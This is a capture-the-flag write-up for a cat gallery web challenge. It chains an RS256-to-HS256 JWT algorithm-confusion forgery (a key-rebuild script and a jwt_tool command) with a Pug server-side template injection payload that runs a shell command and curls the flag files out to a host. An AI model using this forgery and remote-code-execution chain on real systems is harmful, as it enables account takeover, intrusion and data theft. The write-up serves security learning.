In the configuration I find the **JWT secret** and notice it uses:

```
RS256
```

When registering an account, the application provides us with a JWT containing the attribute:

```json
{ "username": "<name>" }
```

After analyzing the token, I look into the source code.

### Sanitizer

```js
function sanitizeUsername(username) {
    const usernameRegex = /^[a-zA-Z0-9]+$/;

    if (!usernameRegex.test(username)) {
        throw new BadRequest("Username can only contain letters and numbers.");
    }

    return username;
}
```

I immediately notice that the `username` input is protected, so **no injection here**.

### Router

```js
router.get("/cats", getCurrentUser, (req, res) => {
    if (!req.user) {
        return res.redirect("/login?error=Please log in to view the cat gallery");
    }

    const templatePath = path.join(__dirname, "views", "cats.pug");

    fs.readFile(templatePath, "utf8", (err, template) => {
        if (err) {
            return res.render("cats");
        }

        if (typeof req.user != "undefined") {
            template = template.replace(/guest/g, req.user);
        }

        const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });

        res.send(html);
    });
});
```

Here I notice **two important things**:

1. The value of `username` is reflected.
2. It’s reflected inside a **Pug template**, which means we can likely achieve **SSTI** if we can manipulate `username`.

### Token verification

```js
function getCurrentUser(req, res, next) {
    const token = req.cookies.token;

    if (token) {
        verifyJWT(token)
            .then((payload) => {
                req.user = payload.username;
                res.locals.user = req.user;
                next();
            })
            .catch(() => {
                req.user = null;
                res.locals.user = null;
                next();
            });
    } else {
        req.user = null;
        res.locals.user = null;
        next();
    }
}
```

Here I see that the `username` is retrieved **directly from the JWT token**.
So, if I can **modify the JWT username**, I can trigger **SSTI**.

But to do that, I need to **sign a valid JWT**.
The problem: the keys provided in the source code are **not the same** as the ones used by the server (seen in the Dockerfile).

### The trick: RS256 → HS256

To bypass this, I attempt the classic **RS256 to HS256 JWT attack**.

First, I retrieve the **JWK** from:

```
/jwks.json
```

Then, I reconstruct the **RSA public key**:

```python
def rsa_public_key_from_jwk(jwk):
    print(f"[*] Recreating RSA Public Key from JWK...")

    n = base64url_decode(jwk['n'].encode('utf-8'))
    e = base64url_decode(jwk['e'].encode('utf-8'))

    n_int = int.from_bytes(n, 'big')
    e_int = int.from_bytes(e, 'big')

    rsa_key = RSA.construct((n_int, e_int))
    public_key_pem = rsa_key.export_key('PEM')

    with open("recovered_public.key", "wb") as f:
        f.write(public_key_pem)
        if not public_key_pem.endswith(b'\n'):
            f.write(b"\n")

    print(f"[*] Recreated RSA Public Key saved to 'recovered_public.key':\n{public_key_pem.decode()}")
    return
```

### Modifying the JWT

I then use **jwt\_tool** to forge the token:

```
jwt_tool.py <JWT token> -X k -pk recovered_public.key -I -pc username -pv <payload>
```

Where the payload is:

```js
#{function(){
    localLoad = global.process.mainModule.constructor._load;
    sh = localLoad('child_process').exec(
        'curl https://catclub-0.ctf.intigriti.io/?flag=$(cat /flag* | base64)'
    )
}()}
```

(adapted depending on the case).

Finally, I replace my cookie with this **malicious JWT**.

When I visit the `/cats` page, I retrieve:

```
INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}
```